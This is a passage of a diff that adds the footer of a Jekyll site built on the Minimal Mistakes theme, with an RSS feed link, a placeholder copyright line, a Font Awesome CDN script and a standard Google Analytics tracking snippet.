+    <li><a href="/feed.xml"><svg class="svg-inline--fa fa-rss-square fa-w-14 fa-fw" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="rss-square" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M400 32H48C21.49 32 0 53.49 0 80v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V80c0-26.51-21.49-48-48-48zM112 416c-26.51 0-48-21.49-48-48s21.49-48 48-48 48 21.49 48 48-21.49 48-48 48zm157.533 0h-34.335c-6.011 0-11.051-4.636-11.442-10.634-5.214-80.05-69.243-143.92-149.123-149.123-5.997-.39-10.633-5.431-10.633-11.441v-34.335c0-6.535 5.468-11.777 11.994-11.425 110.546 5.974 198.997 94.536 204.964 204.964.352 6.526-4.89 11.994-11.425 11.994zm103.027 0h-34.334c-6.161 0-11.175-4.882-11.427-11.038-5.598-136.535-115.204-246.161-251.76-251.76C68.882 152.949 64 147.935 64 141.774V107.44c0-6.454 5.338-11.664 11.787-11.432 167.83 6.025 302.21 141.191 308.205 308.205.232 6.449-4.978 11.787-11.432 11.787z"></path></svg><!-- <i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> --> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2020 Your Name. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script defer="" src="https://use.fontawesome.com/releases/v5.8.1/js/all.js" integrity="sha384-g5uSoOSBd7KkhAMlnQILrecXvzst9TdC09/VM+pjDTCM+1il8RHz5fKANTFFb+gQ" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-138170131-1']);
+  
+    _gaq.push(['_gat._anonymizeIp']);
+  
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script>
+
+
+
+
+
+
+
+
+  
+
+</body></html>
